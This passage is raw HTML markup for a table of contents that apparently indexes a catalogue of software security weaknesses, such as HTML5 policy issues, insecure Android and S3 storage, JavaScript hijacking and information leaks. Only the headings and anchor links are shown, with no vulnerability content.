class="toc-number">1.3.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-97"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-98"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-95"><span class="toc-number">1.3.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Based-Cross-Zone-Scripting"><span class="toc-number">1.3.6.</span> <span class="toc-text">File Based Cross-Zone Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-97"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-98"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-99"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-96"><span class="toc-number">1.3.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Content-Security-Policy"><span class="toc-number">1.3.7.</span> <span class="toc-text">HTML5: Missing Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-98"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-99"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-100"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-97"><span class="toc-number">1.3.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Missing-Framing-Protection"><span class="toc-number">1.3.8.</span> <span class="toc-text">HTML5: Missing Framing Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-99"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-100"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-101"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-98"><span class="toc-number">1.3.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Content-Security-Policy"><span class="toc-number">1.3.9.</span> <span class="toc-text">HTML5: Overly Permissive Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-100"><span class="toc-number">1.3.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-101"><span class="toc-number">1.3.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-102"><span class="toc-number">1.3.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-99"><span class="toc-number">1.3.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Message-Posting-Policy"><span class="toc-number">1.3.10.</span> <span class="toc-text">HTML5: Overly Permissive Message Posting Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-101"><span class="toc-number">1.3.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-102"><span class="toc-number">1.3.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-100"><span class="toc-number">1.3.10.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-CORS-Policy"><span class="toc-number">1.3.11.</span> <span class="toc-text">HTML5: Overly Permissive CORS Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-102"><span class="toc-number">1.3.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-103"><span class="toc-number">1.3.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-103"><span class="toc-number">1.3.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-101"><span class="toc-number">1.3.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Overly-Permissive-Referrer-Policy"><span class="toc-number">1.3.12.</span> <span class="toc-text">HTML5: Overly Permissive Referrer-Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-103"><span class="toc-number">1.3.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-104"><span class="toc-number">1.3.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-104"><span class="toc-number">1.3.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-102"><span class="toc-number">1.3.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Unenforced-Content-Security-Policy"><span class="toc-number">1.3.13.</span> <span class="toc-text">HTML5: Unenforced Content Security Policy</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-104"><span class="toc-number">1.3.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-105"><span class="toc-number">1.3.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-105"><span class="toc-number">1.3.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-103"><span class="toc-number">1.3.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hidden-Field"><span class="toc-number">1.3.14.</span> <span class="toc-text">Hidden Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-105"><span class="toc-number">1.3.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-106"><span class="toc-number">1.3.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-106"><span class="toc-number">1.3.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-104"><span class="toc-number">1.3.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-Backup-Storage"><span class="toc-number">1.3.15.</span> <span class="toc-text">Insecure Storage: Android Backup Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-106"><span class="toc-number">1.3.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-107"><span class="toc-number">1.3.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-107"><span class="toc-number">1.3.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-105"><span class="toc-number">1.3.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-External-Storage"><span class="toc-number">1.3.16.</span> <span class="toc-text">Insecure Storage: Android External Storage</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-107"><span class="toc-number">1.3.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-108"><span class="toc-number">1.3.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-108"><span class="toc-number">1.3.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-106"><span class="toc-number">1.3.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Android-World-Readable-or-Writeable"><span class="toc-number">1.3.17.</span> <span class="toc-text">Insecure Storage: Android World Readable or Writeable</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-108"><span class="toc-number">1.3.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-109"><span class="toc-number">1.3.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-109"><span class="toc-number">1.3.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-107"><span class="toc-number">1.3.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-HTTP-Response-Cache-Leak"><span class="toc-number">1.3.18.</span> <span class="toc-text">Insecure Storage: HTTP Response Cache Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-109"><span class="toc-number">1.3.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-110"><span class="toc-number">1.3.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-110"><span class="toc-number">1.3.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-108"><span class="toc-number">1.3.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-Missing-Database-Encryption"><span class="toc-number">1.3.19.</span> <span class="toc-text">Insecure Storage: Missing Database Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-110"><span class="toc-number">1.3.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-111"><span class="toc-number">1.3.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-111"><span class="toc-number">1.3.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-109"><span class="toc-number">1.3.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Full-Anonymous-Access"><span class="toc-number">1.3.20.</span> <span class="toc-text">Insecure Storage: S3 Full Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-111"><span class="toc-number">1.3.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-112"><span class="toc-number">1.3.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-112"><span class="toc-number">1.3.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-110"><span class="toc-number">1.3.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-ACP-Anonymous-Access"><span class="toc-number">1.3.21.</span> <span class="toc-text">Insecure Storage: S3 Read ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-112"><span class="toc-number">1.3.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-113"><span class="toc-number">1.3.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-113"><span class="toc-number">1.3.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-111"><span class="toc-number">1.3.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Read-Anonymous-Access"><span class="toc-number">1.3.22.</span> <span class="toc-text">Insecure Storage: S3 Read Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-113"><span class="toc-number">1.3.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-114"><span class="toc-number">1.3.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-114"><span class="toc-number">1.3.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-112"><span class="toc-number">1.3.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-ACP-Anonymous-Access"><span class="toc-number">1.3.23.</span> <span class="toc-text">Insecure Storage: S3 Write ACP Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-114"><span class="toc-number">1.3.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-115"><span class="toc-number">1.3.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-115"><span class="toc-number">1.3.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-113"><span class="toc-number">1.3.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Storage-S3-Write-Anonymous-Access"><span class="toc-number">1.3.24.</span> <span class="toc-text">Insecure Storage: S3 Write Anonymous Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-115"><span class="toc-number">1.3.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-116"><span class="toc-number">1.3.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-116"><span class="toc-number">1.3.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-114"><span class="toc-number">1.3.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-Leftover-Debug-Code"><span class="toc-number">1.3.25.</span> <span class="toc-text">J2EE Bad Practices: Leftover Debug Code</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-116"><span class="toc-number">1.3.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-117"><span class="toc-number">1.3.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-117"><span class="toc-number">1.3.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-115"><span class="toc-number">1.3.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking"><span class="toc-number">1.3.26.</span> <span class="toc-text">JavaScript Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-117"><span class="toc-number">1.3.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-118"><span class="toc-number">1.3.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-118"><span class="toc-number">1.3.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-116"><span class="toc-number">1.3.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-Hijacking-Vulnerable-Framework"><span class="toc-number">1.3.27.</span> <span class="toc-text">JavaScript Hijacking: Vulnerable Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-118"><span class="toc-number">1.3.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-119"><span class="toc-number">1.3.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-117"><span class="toc-number">1.3.27.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Sensitive-Field-Exposure"><span class="toc-number">1.3.28.</span> <span class="toc-text">Mass Assignment: Sensitive Field Exposure</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-119"><span class="toc-number">1.3.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-120"><span class="toc-number">1.3.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-119"><span class="toc-number">1.3.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-118"><span class="toc-number">1.3.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Logger-Not-Declared-Static-Final"><span class="toc-number">1.3.29.</span> <span class="toc-text">Poor Logging Practice: Logger Not Declared Static Final</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-120"><span class="toc-number">1.3.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-121"><span class="toc-number">1.3.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-120"><span class="toc-number">1.3.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-119"><span class="toc-number">1.3.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Multiple-Loggers"><span class="toc-number">1.3.30.</span> <span class="toc-text">Poor Logging Practice: Multiple Loggers</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-121"><span class="toc-number">1.3.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-122"><span class="toc-number">1.3.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-121"><span class="toc-number">1.3.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-120"><span class="toc-number">1.3.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream"><span class="toc-number">1.3.31.</span> <span class="toc-text">Poor Logging Practice: Use of a System Output Stream</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-122"><span class="toc-number">1.3.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-123"><span class="toc-number">1.3.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-122"><span class="toc-number">1.3.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-121"><span class="toc-number">1.3.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Non-final-Public-Static-Field"><span class="toc-number">1.3.32.</span> <span class="toc-text">Poor Style: Non-final Public Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-123"><span class="toc-number">1.3.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-124"><span class="toc-number">1.3.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-123"><span class="toc-number">1.3.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-122"><span class="toc-number">1.3.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak"><span class="toc-number">1.3.33.</span> <span class="toc-text">System Information Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-124"><span class="toc-number">1.3.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-125"><span class="toc-number">1.3.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-124"><span class="toc-number">1.3.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-123"><span class="toc-number">1.3.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis"><span class="toc-number">1.3.34.</span> <span class="toc-text">System Information Leak: Apache Axis</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-125"><span class="toc-number">1.3.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-126"><span class="toc-number">1.3.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-125"><span class="toc-number">1.3.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-124"><span class="toc-number">1.3.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis-2"><span class="toc-number">1.3.35.</span> <span class="toc-text">System Information Leak: Apache Axis 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-126"><span class="toc-number">1.3.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-127"><span class="toc-number">1.3.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-126"><span class="toc-number">1.3.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-125"><span class="toc-number">1.3.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-External"><span class="toc-number">1.3.36.</span> <span class="toc-text">System Information Leak: External</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-127"><span class="toc-number">1.3.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-128"><span class="toc-number">1.3.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-127"><span class="toc-number">1.3.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-126"><span class="toc-number">1.3.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-HTML-Comment-in-JSP"><span class="toc-number">1.3.37.</span> <span class="toc-text">System Information Leak: HTML Comment in JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-128"><span class="toc-number">1.3.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-129"><span class="toc-number">1.3.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-128"><span class="toc-number">1.3.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-127"><span class="toc-number">1.3.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Incomplete-Servlet-Error-Handling"><span class="toc-number">1.3.38.</span> <span class="toc-text">System Information Leak: Incomplete Servlet Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-129"><span class="toc-number">1.3.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-130"><span class="toc-number">1.3.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-129"><span class="toc-number">1.3.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-128"><span class="toc-number">1.3.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Internal"><span class="toc-number">1.3.39.</span> <span class="toc-text">System Information Leak: Internal</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-130"><span class="toc-number">1.3.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-131"><span class="toc-number">1.3.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-130"><span class="toc-number">1.3.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-129"><span class="toc-number">1.3.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Overly-Broad-SQL-Logging"><span class="toc-number">1.3.40.</span> <span class="toc-text">System Information Leak: Overly Broad SQL Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-131"><span class="toc-number">1.3.40.1.</span> 